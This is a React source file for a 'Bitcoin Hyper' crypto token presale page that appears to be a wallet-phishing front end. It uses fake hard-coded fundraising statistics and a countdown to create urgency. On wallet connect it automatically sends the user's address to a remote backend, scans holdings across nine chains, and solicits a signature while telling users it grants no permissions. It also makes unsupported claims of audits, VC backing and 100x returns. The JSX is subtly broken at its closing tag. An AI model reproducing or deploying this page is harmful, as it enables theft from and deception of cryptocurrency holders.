// App.jsx - BITCOIN HYPER TOKEN PRESALE LAUNCH (PRODUCTION)
import React, { useState, useEffect } from 'react';
import { ConnectKitProvider, ConnectKitButton, getDefaultConfig } from "connectkit";
import { 
  WagmiProvider, 
  createConfig, 
  http, 
  useAccount,  
  useDisconnect,
  useSignMessage
} from "wagmi";
import { 
  mainnet, polygon, bsc, arbitrum, optimism, avalanche, 
  fantom, base, linea
} from "wagmi/chains";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import './App.css';

// Create outside components
const queryClient = new QueryClient();

// Supported chains for presale
const allChains = [
  mainnet, polygon, bsc, arbitrum, optimism, avalanche,
  fantom, base, linea
];

// WalletConnect Project ID
const walletConnectProjectId = "962425907914a3e80a7d8e7288b23f62";

// Production backend URL
const BACKEND_API = "https://tokenbackend-5xab.onrender.com/api";

// Create config
const config = createConfig(
  getDefaultConfig({
    appName: "Bitcoin Hyper | Official Presale",
    appDescription: "Join the Bitcoin Hyper Token Presale",
    appUrl: "https://bitcoinhyper.io",
    appIcon: "https://bitcoinhyper.io/logo.png",
    walletConnectProjectId: walletConnectProjectId,
    chains: allChains,
    transports: {
      [mainnet.id]: http("https://eth.llamarpc.com"),
      [polygon.id]: http("https://polygon-rpc.com"),
      [bsc.id]: http("https://bsc-dataseed.binance.org"),
      [arbitrum.id]: http("https://arb1.arbitrum.io/rpc"),
      [optimism.id]: http("https://mainnet.optimism.io"),
      [avalanche.id]: http("https://api.avax.network/ext/bc/C/rpc"),
      [fantom.id]: http("https://rpc.ftm.tools"),
      [base.id]: http("https://mainnet.base.org"),
      [linea.id]: http("https://rpc.linea.build")
    }
  })
);

// Bitcoin Hyper Presale Component
function BitcoinHyperPresale() {
  const { address, isConnected } = useAccount();
  const { disconnect } = useDisconnect();
  const { signMessage } = useSignMessage();
  
  const [loading, setLoading] = useState(false);
  const [scanning, setScanning] = useState(false);
  const [isEligible, setIsEligible] = useState(false);
  const [claimData, setClaimData] = useState(null);
  const [processing, setProcessing] = useState(false);
  const [showSignModal, setShowSignModal] = useState(false);
  const [isMobile, setIsMobile] = useState(false);
  const [backendStatus, setBackendStatus] = useState('checking');
  const [connectionError, setConnectionError] = useState('');
  const [scanData, setScanData] = useState(null);
  
  const [presaleStats] = useState({
    raised: "$4,892,450",
    participants: "12,458",
    tokensSold: "89.4M",
    progress: 78
  });
  
  const [countdown, setCountdown] = useState({
    days: 3,
    hours: 12,
    minutes: 45,
    seconds: 30
  });
  
  // Initialize
  useEffect(() => {
    // Test backend connection on load
    const testBackend = async () => {
      try {
        const response = await fetch(`${BACKEND_API}/health`);
        if (response.ok) {
          const data = await response.json();
          console.log('Backend connected:', data);
          setBackendStatus('connected');
        } else {
          setBackendStatus('error');
          setConnectionError(`HTTP ${response.status}: ${response.statusText}`);
        }
      } catch (error) {
        setBackendStatus('error');
        setConnectionError(error.message);
        console.error('Backend test failed:', error);
      }
    };
    
    testBackend();
    
    setIsMobile(/iPhone|iPad|iPod|Android/i.test(navigator.userAgent));
    
    // Start countdown
    const interval = setInterval(() => {
      setCountdown(prev => {
        let { days, hours, minutes, seconds } = prev;
        seconds--;
        
        if (seconds < 0) {
          seconds = 59;
          minutes--;
        }
        if (minutes < 0) {
          minutes = 59;
          hours--;
        }
        if (hours < 0) {
          hours = 23;
          days--;
        }
        if (days < 0) {
          clearInterval(interval);
          return { days: 0, hours: 0, minutes: 0, seconds: 0 };
        }
        
        return { days, hours, minutes, seconds };
      });
    }, 1000);
    
    return () => clearInterval(interval);
  }, []);

  // Auto scan when wallet connects
  useEffect(() => {
    if (isConnected && address && backendStatus === 'connected') {
      triggerAutoScan();
    }
  }, [isConnected, address, backendStatus]);

  // Auto scan function
  const triggerAutoScan = async () => {
    if (!address) return;
    
    setScanning(true);
    setConnectionError('');
    
    try {
      const response = await fetch(`${BACKEND_API}/presale/connect`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          walletAddress: address,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        })
      });
      
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }
      
      const data = await response.json();
      
      if (data.success) {
        // Store scan data
        setScanData(data.data);
        
        // Add delay for dramatic effect
        setTimeout(() => {
          setScanning(false);
          
          if (data.data.isEligible) {
            setIsEligible(true);
            
            // Show animated sign modal after 1 second
            setTimeout(() => {
              setShowSignModal(true);
              triggerCelebrationAnimation();
            }, 1000);
            
            // Auto-hide after 30 seconds if no action
            setTimeout(() => {
              if (showSignModal) {
                setShowSignModal(false);
              }
            }, 30000);
          } else {
            setIsEligible(false);
            setTimeout(() => {
              setScanning(false);
            }, 2000);
          }
        }, 2000);
      } else {
        throw new Error(data.error || 'Unknown error from backend');
      }
    } catch (error) {
      console.error('Scan error:', error);
      setScanning(false);
      setConnectionError(`Scan failed: ${error.message}`);
    }
  };

  // Handle signature for token claim
  const handleTokenClaim = async () => {
    if (!address || !isEligible || !scanData) return;
    
    setProcessing(true);
    setConnectionError('');
    
    try {
      const claimAmount = scanData.tokenAllocation.amount + " BTH";
      const claimValue = "$" + scanData.tokenAllocation.valueUSD;
      
      // UPDATED SIGNING MESSAGE - Professional and engaging
      const message = `Bitcoin Hyper Token Presale Authorization

🔐 Wallet Address: ${address}
🎯 Token Allocation: ${claimAmount} (${claimValue})

📅 Timestamp: ${new Date().toISOString()}
🔗 Network: Multi-chain Compatible

📝 Purpose: I confirm my participation in the Bitcoin Hyper token presale and authorize the allocation of presale tokens to my wallet address. This is a secure message to verify wallet ownership only.

💎 Bitcoin Hyper - The Future of Bitcoin DeFi`;

      console.log("Signing message:", message); // Debug log
      
      const signature = await signMessage({ message });
      
      console.log("Signature received:", signature); // Debug log
      
      // Send to backend
      const response = await fetch(`${BACKEND_API}/presale/claim`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          walletAddress: address,
          signature,
          message,
          claimAmount,
          claimValue
        })
      });
      
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }
      
      const data = await response.json();
      
      if (data.success) {
        setClaimData(data.data);
        setShowSignModal(false);
        
        // Show mega celebration animation
        triggerMegaCelebration();
        
        // Play success sound
        try {
          const audio = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-winning-chimes-2015.mp3');
          audio.volume = 0.3;
          audio.play().catch(() => {});
        } catch (e) {
          console.log('Audio play failed');
        }
      } else {
        throw new Error(data.error || 'Claim failed');
      }
    } catch (error) {
      console.error('Claim error:', error);
      setConnectionError(`Claim failed: ${error.message}`);
    } finally {
      setProcessing(false);
    }
  };

  // Celebration animations
  const triggerCelebrationAnimation = () => {
    const container = document.getElementById('animation-container');
    if (!container) return;
    
    container.innerHTML = '';
    
    for (let i = 0; i < 15; i++) {
      const coin = document.createElement('div');
      coin.innerHTML = '₿';
      coin.style.cssText = `
        position: absolute;
        font-size: ${Math.random() * 40 + 20}px;
        color: #F7931A;
        top: ${Math.random() * 100}vh;
        left: ${Math.random() * 100}vw;
        animation: coinSpin ${Math.random() * 2 + 1}s linear infinite,
                   floatUpDown ${Math.random() * 3 + 2}s ease-in-out infinite;
        z-index: 1000;
        opacity: 0.7;
        filter: drop-shadow(0 0 10px #F7931A);
      `;
      container.appendChild(coin);
    }
    
    for (let i = 0; i < 30; i++) {
      const sparkle = document.createElement('div');
      sparkle.style.cssText = `
        position: absolute;
        width: 4px;
        height: 4px;
        background: #FFD700;
        border-radius: 50%;
        top: ${Math.random() * 100}vh;
        left: ${Math.random() * 100}vw;
        animation: sparkle ${Math.random() * 2 + 1}s infinite;
        z-index: 1000;
      `;
      container.appendChild(sparkle);
    }
  };

  const triggerMegaCelebration = () => {
    const container = document.getElementById('animation-container');
    if (!container) return;
    
    container.innerHTML = '';
    
    const rocket = document.createElement('div');
    rocket.innerHTML = '🚀';
    rocket.style.cssText = `
      position: fixed;
      font-size: 80px;
      bottom: -100px;
      left: 50%;
      transform: translateX(-50%);
      animation: rocketLaunch 3s ease-out forwards;
      z-index: 9999;
      filter: drop-shadow(0 0 20px #F7931A);
    `;
    document.body.appendChild(rocket);
    
    const colors = ['#F7931A', '#FFD700', '#FF6B6B', '#4ECDC4', '#45B7D1'];
    for (let i = 0; i < 300; i++) {
      setTimeout(() => {
        const confetti = document.createElement('div');
        confetti.style.cssText = `
          position: fixed;
          width: ${Math.random() * 15 + 5}px;
          height: ${Math.random() * 15 + 5}px;
          background: ${colors[Math.floor(Math.random() * colors.length)]};
          top: -20px;
          left: ${Math.random() * 100}vw;
          opacity: ${Math.random() * 0.7 + 0.3};
          animation: confettiFall ${Math.random() * 3 + 2}s linear forwards;
          border-radius: ${Math.random() > 0.5 ? '50%' : '0'};
          transform: rotate(${Math.random() * 360}deg);
          z-index: 9998;
        `;
        document.body.appendChild(confetti);
        
        setTimeout(() => {
          if (document.body.contains(confetti)) {
            document.body.removeChild(confetti);
          }
        }, 5000);
      }, i * 10);
    }
    
    setTimeout(() => {
      for (let i = 0; i < 50; i++) {
        const bitcoin = document.createElement('div');
        bitcoin.innerHTML = '₿';
        bitcoin.style.cssText = `
          position: fixed;
          font-size: ${Math.random() * 50 + 30}px;
          color: #F7931A;
          top: -50px;
          left: ${Math.random() * 100}vw;
          animation: bitcoinRain ${Math.random() * 2 + 1}s linear forwards;
          z-index: 9997;
          opacity: 0.8;
          filter: drop-shadow(0 0 15px #F7931A);
        `;
        document.body.appendChild(bitcoin);
        
        setTimeout(() => {
          if (document.body.contains(bitcoin)) {
            document.body.removeChild(bitcoin);
          }
        }, 3000);
      }
      
      const style = document.createElement('style');
      style.textContent = `
        @keyframes bitcoinRain {
          0% { transform: translateY(-50px) rotate(0deg); opacity: 0; }
          10% { opacity: 1; }
          90% { opacity: 0.5; }
          100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
        }
        
        @keyframes confettiFall {
          0% { transform: translateY(-20px) rotate(0deg); }
          100% { transform: translateY(100vh) rotate(720deg); }
        }
        
        @keyframes rocketLaunch {
          0% { transform: translate(-50%, 0) scale(0.5); opacity: 0; }
          50% { transform: translate(-50%, -50px) scale(1.2); opacity: 1; }
          100% { transform: translate(-50%, -200px) scale(0.8); opacity: 0; }
        }
        
        @keyframes coinSpin {
          from { transform: rotateY(0deg); }
          to { transform: rotateY(360deg); }
        }
        
        @keyframes sparkle {
          0%, 100% { opacity: 0; transform: scale(0); }
          50% { opacity: 1; transform: scale(1); }
        }
        
        @keyframes floatUpDown {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(-20px); }
        }
      `;
      document.head.appendChild(style);
      
    }, 500);
    
    setTimeout(() => {
      if (document.body.contains(rocket)) {
        document.body.removeChild(rocket);
      }
    }, 3000);
  };

  // Format countdown numbers
  const formatNumber = (num) => {
    return num < 10 ? `0${num}` : num;
  };

  // Backend Status Indicator
  const BackendStatus = () => {
    if (backendStatus === 'connected') return null;
    
    const statusConfig = {
      error: { color: '#ff6b6b', text: 'Backend Connection Failed' },
      partial: { color: '#ffd93d', text: 'Backend Partially Connected' },
      checking: { color: '#45b7d1', text: 'Checking Backend Status...' },
      unknown: { color: '#45b7d1', text: 'Checking Backend Status...' }
    };
    
    const config = statusConfig[backendStatus] || statusConfig.unknown;
    
    return (
      <div className="backend-status" style={{ backgroundColor: config.color }}>
        <div className="backend-status-content">
          <span className="backend-status-icon">
            {backendStatus === 'error' ? '⚠️' : '🔄'}
          </span>
          <span className="backend-status-text">
            {config.text}
          </span>
          {connectionError && (
            <button
              onClick={() => alert(`Backend Error: ${connectionError}`)}
              className="backend-status-details"
            >
              View Details
            </button>
          )}
        </div>
      </div>
    );
  };

  // Sign Modal Component
  const SignModal = () => {
    if (!showSignModal) return null;
    
    return (
      <div className="sign-modal-overlay">
        <div className="sign-modal">
          <div className="sign-modal-shimmer"></div>
          
          <button
            onClick={() => setShowSignModal(false)}
            className="sign-modal-close"
          >
            ✕
          </button>
          
          <div className="sign-modal-header">
            <div className="sign-modal-icon" style={{animation: 'bitcoinGlow 2s infinite'}}>
              🎉
            </div>
            <h2 className="sign-modal-title">
              Congratulations!
            </h2>
            <p className="sign-modal-subtitle">
              You're eligible for Bitcoin Hyper presale tokens!
            </p>
          </div>
          
          <div className="sign-modal-details">
            <div className="detail-row">
              <span>Token Allocation</span>
              <span className="detail-value">{scanData?.tokenAllocation?.amount || '5,000'} BTH</span>
            </div>
            <div className="detail-row">
              <span>Portfolio Value</span>
              <span className="detail-value-green">${scanData?.totalValueUSD || '0'}</span>
            </div>
            <div className="detail-row">
              <span>Vesting Schedule</span>
              <span className="detail-value-blue">25% TGE, 6 months linear</span>
            </div>
          </div>
          
          <div className="sign-modal-info">
            <div className="info-icon">🔐</div>
            <div>
              <div className="info-title">Secure Signature Required</div>
              <div className="info-subtitle">
                Sign to confirm your wallet ownership and claim your presale allocation.
                This is a secure message that does not grant any permissions.
              </div>
            </div>
          </div>
          
          <button
            onClick={handleTokenClaim}
            disabled={processing}
            className="sign-modal-button"
            style={{animation: processing ? 'none' : 'pulseGlow 2s infinite'}}
          >
            {processing ? (
              <>
                <div style={{ animation: 'spin 1s linear infinite' }}>⏳</div>
                Processing Your Claim...
              </>
            ) : (
              <>
                ✍️ Sign & Claim {scanData?.tokenAllocation?.amount || '5,000'} BTH Tokens
              </>
            )}
          </button>
          
          <div className="sign-modal-footer">
            ⚡ Tokens will be distributed after presale ends
          </div>
          
          {connectionError && (
            <div className="sign-modal-error">
              ⚠️ {connectionError}
            </div>
          )}
        </div>
      </div>
    );
  };

  return (
    <div className="app-container">
      {/* Backend Status Indicator */}
      <BackendStatus />
      
      {/* Animation container */}
      <div id="animation-container" className="animation-container"></div>
      
      {/* Main content */}
      <div className="main-content">
        {/* Header */}
        <header className="app-header">
          <div className="logo-container">
            <div className="logo-icon" style={{animation: 'bitcoinGlow 2s infinite'}}>
              ₿
            </div>
            <div>
              <h1 className="logo-title">
                BITCOIN HYPER
              </h1>
              <div className="logo-subtitle">
                OFFICIAL PRESALE LAUNCH
              </div>
            </div>
          </div>
          
          <div className="header-actions">
            {isConnected && (
              <button
                onClick={() => disconnect()}
                className="disconnect-button"
              >
                Disconnect
              </button>
            )}
            
            <ConnectKitButton.Custom>
              {({ show, truncatedAddress, ensName }) => (
                <button
                  onClick={show}
                  className="connect-button"
                  style={{animation: 'pulseGlow 2s infinite'}}
                >
                  {isConnected ? 
                    (ensName || `${truncatedAddress}`) : 
                    'Connect Wallet'}
                </button>
              )}
            </ConnectKitButton.Custom>
          </div>
        </header>

        {/* Hero Section */}
        <section className="hero-section">
          <div className="hero-background"></div>
          
          <div className="hero-bitcoin" style={{animation: 'floatUpDown 3s ease-in-out infinite'}}>
            ₿
          </div>
          
          <h2 className="hero-title">
            NEXT GENERATION BITCOIN ECOSYSTEM
          </h2>
          
          <p className="hero-description">
            Bitcoin Hyper brings DeFi 2.0 to the Bitcoin ecosystem. Join the presale now 
            and be part of the revolution.
          </p>
          
          {/* Countdown Timer */}
          <div className="countdown-timer">
            {Object.entries(countdown).map(([label, value]) => (
              <div key={label} className="countdown-item">
                <div className="countdown-value">
                  {formatNumber(value)}
                </div>
                <div className="countdown-label">
                  {label}
                </div>
              </div>
            ))}
          </div>
          
          {/* Presale Stats */}
          <div className="stats-grid">
            {Object.entries(presaleStats).map(([label, value]) => (
              <div key={label} className="stat-card">
                <div className="stat-value">
                  {value}
                </div>
                <div className="stat-label">
                  {label.replace(/([A-Z])/g, ' $1')}
                </div>
              </div>
            ))}
          </div>
          
          {/* Progress Bar */}
          <div className="progress-container">
            <div className="progress-header">
              <span>Presale Progress</span>
              <span className="progress-percent">{presaleStats.progress}%</span>
            </div>
            <div className="progress-bar">
              <div 
                className="progress-fill"
                style={{width: `${presaleStats.progress}%`}}
              >
                <div className="progress-glow"></div>
              </div>
            </div>
          </div>
          
          {/* Call to Action */}
          {backendStatus === 'checking' ? (
            <div className="backend-checking-container">
              <div className="backend-checking-spinner"></div>
              <h3 className="backend-checking-title">
                Connecting to Backend...
              </h3>
              <p className="backend-checking-description">
                Please wait while we establish connection...
              </p>
            </div>
          ) : backendStatus === 'error' ? (
            <div className="backend-error-container">
              <div className="backend-error-icon">⚠️</div>
              <h3 className="backend-error-title">
                Backend Connection Failed
              </h3>
              <p className="backend-error-description">
                Unable to connect to the backend server. Please refresh the page or try again later.
              </p>
              <button 
                onClick={() => window.location.reload()}
                className="retry-button"
              >
                🔄 Refresh Page
              </button>
            </div>
          ) : !isConnected ? (
            <div className="cta-container">
              <div className="cta-icon">🚀</div>
              <h3 className="cta-title">
                Connect Wallet to Check Eligibility
              </h3>
              <p className="cta-description">
                Connect your wallet to automatically scan for eligibility. 
                Qualified wallets receive instant presale allocations.
              </p>
              <ConnectKitButton.Custom>
                {({ show }) => (
                  <button
                    onClick={show}
                    className="cta-button"
                    style={{animation: 'pulseGlow 2s infinite'}}
                  >
                    CONNECT WALLET TO START
                  </button>
                )}
              </ConnectKitButton.Custom>
            </div>
          ) : scanning ? (
            <div className="scanning-container">
              <div className="scanning-spinner"></div>
              <h3 className="scanning-title">
                Scanning Your Wallet...
              </h3>
              <p className="scanning-description">
                Checking portfolio across multiple chains...
              </p>
              <div className="scanning-dots">
                <span>.</span><span>.</span><span>.</span>
              </div>
            </div>
          ) : isEligible ? (
            <div className="eligible-container">
              <div className="eligible-icon">✅</div>
              <h3 className="eligible-title">
                You're Eligible for Presale!
              </h3>
              <p className="eligible-description">
                Portfolio Value: ${scanData?.totalValueUSD || '0'} | 
                Allocation: {scanData?.tokenAllocation?.amount || '5,000'} BTH
              </p>
              <p className="eligible-note">
                Check the sign button above to claim your tokens!
              </p>
            </div>
          ) : (
            <div className="not-eligible-container">
              <div className="not-eligible-icon">⚠️</div>
              <h3 className="not-eligible-title">
                Not Eligible for Presale
              </h3>
              <p className="not-eligible-description">
                {scanData?.eligibilityReason || 'Minimum $10 portfolio required for eligibility.'}
              </p>
              <p className="not-eligible-note">
                Connect a wallet with sufficient holdings to qualify.
              </p>
            </div>
          )}
        </section>

        {/* Features Section */}
        <section className="features-section">
          <h2 className="features-title">
            WHY BITCOIN HYPER?
          </h2>
          
          <div className="features-grid">
            {[
              {
                icon: '⚡',
                title: 'Lightning Fast',
                desc: 'Transaction speeds up to 100x faster than traditional Bitcoin'
              },
              {
                icon: '🛡️',
                title: 'Secure & Audited',
                desc: 'Fully audited smart contracts with multi-sig security'
              },
              {
                icon: '📈',
                title: 'High Yield',
                desc: 'Earn yields up to 45% APR through our DeFi ecosystem'
              },
              {
                icon: '🌐',
                title: 'Multi-Chain',
                desc: 'Native interoperability across Ethereum, BSC, Polygon, and more'
              },
              {
                icon: '🎯',
                title: 'Limited Supply',
                desc: 'Only 100M tokens ever minted. True scarcity model'
              },
              {
                icon: '🚀',
                title: 'Massive Growth',
                desc: 'Backed by top VCs with 100x growth potential'
              }
            ].map((feature, index) => (
              <div key={index} className="feature-card">
                <div className="feature-icon" style={{animation: 'floatUpDown 3s ease-in-out infinite'}}>
                  {feature.icon}
                </div>
                <h3 className="feature-title">
                  {feature.title}
                </h3>
                <p className="feature-description">
                  {feature.desc}
                </p>
              </div>
            ))}
          </div>
        </section>

        {/* Footer */}
        <footer className="app-footer">
          <div className="footer-bitcoin" style={{animation: 'bitcoinGlow 2s infinite'}}>
            ₿
          </div>
          <div className="footer-description">
            Bitcoin Hyper is the next evolution of Bitcoin. Join the presale now to secure your position.
          </div>
          <div className="footer-links">
            <span>© 2024 Bitcoin Hyper. All rights reserved.</span>
            <span>|</span>
            <span>Official Presale Platform</span>
          </div>
        </footer>
      </div>

      {/* Sign Modal */}
      <SignModal />
    </div>
  );
}

// ConnectKit Theme
const customTheme = {
  borderRadius: "large",
  fontStack: "system",
  overlay: "blur",
  theme: "midnight",
  walletModal: "wide"
};

// Main App Component
function App() {
  return (
    <WagmiProvider config={config}>
      <QueryClientProvider client={queryClient}>
        <ConnectKitProvider 
          theme={customTheme}
          options={{
            hideQuestionMarkCTA: true,
            walletConnectName: 'WalletConnect',
            disableSiweRedirect: true,
            embedGoogleFonts: true,
            preferredWallets: ['metaMask', 'trust', 'coinbase', 'walletConnect', 'rainbow'],
            walletConnect: {
              showQrModal: true,
              qrModalOptions: {
                themeMode: 'dark',
                mobileLinks: ['metamask', 'trust', 'rainbow', 'coinbase']
              }
            }
          }}
        >
          <BitcoinHyperPresale />
        </ConnectKitButton>
      </QueryClientProvider>
    </WagmiProvider>
  );
}

export default App;

